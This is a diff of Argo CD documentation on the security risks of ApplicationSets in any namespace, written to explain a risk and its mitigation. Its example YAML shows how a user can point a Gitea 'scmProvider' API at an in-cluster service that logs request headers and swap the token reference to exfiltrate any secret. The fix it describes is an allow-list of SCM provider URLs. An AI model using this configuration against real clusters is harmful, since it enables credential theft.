@@ -25,7 +25,9 @@ This feature can only be enabled and used when your Argo CD ApplicationSet contr
 
 ### SCM Providers secrets consideration
 
-By allowing ApplicationSet in any namespace you must be aware that any secrets can be exfiltrated using `scmProvider` or `pullRequest` generators.
+By allowing ApplicationSet in any namespace you must be aware that any secrets can be exfiltrated using `scmProvider` or `pullRequest` generators. This means if ApplicationSet controller is configured to allow namespace `appNs` and some user is allowed to create 
+an ApplicationSet in `appNs` namespace, then the user can install a malicious Pod into the `appNs` namespace as described below
+and read out the content of the secret indirectly, thus exfiltrating the secret value.
 
 Here is an example:
 
@@ -34,6 +36,7 @@ apiVersion: argoproj.io/v1alpha1
 kind: ApplicationSet
 metadata:
   name: myapps
+  namespace: appNs
 spec:
   goTemplate: true
   goTemplateOptions: ["missingkey=error"]
@@ -43,7 +46,7 @@ spec:
         # The Gitea owner to scan.
         owner: myorg
         # With this malicious setting, user can send all request to a Pod that will log incoming requests including headers with tokens
-        api: http://my-service.my-namespace.svc.cluster.local
+        api: http://my-service.appNs.svc.cluster.local
         # If true, scan every branch of every repository. If false, scan only the default branch. Defaults to false.
         allBranches: true
         # By changing this token reference, user can exfiltrate any secrets
@@ -53,7 +56,7 @@ spec:
   template:
 ```
 
-Therefore administrator must restrict the urls of the allowed SCM Providers (example: `https://git.mydomain.com/,https://gitlab.mydomain.com/`) by setting the environment variable `ARGOCD_APPLICATIONSET_CONTROLLER_ALLOWED_SCM_PROVIDERS` to argocd-cmd-params-cm `applicationsetcontroller.allowed.scm.providers`. If another url is used, it will be rejected by the applicationset controller.
+In order to prevent the scenario above administrator must restrict the urls of the allowed SCM Providers (example: `https://git.mydomain.com/,https://gitlab.mydomain.com/`) by setting the environment variable `ARGOCD_APPLICATIONSET_CONTROLLER_ALLOWED_SCM_PROVIDERS` to argocd-cmd-params-cm `applicationsetcontroller.allowed.scm.providers`. If another url is used, it will be rejected by the applicationset controller.
 
 For example:
 ```yaml
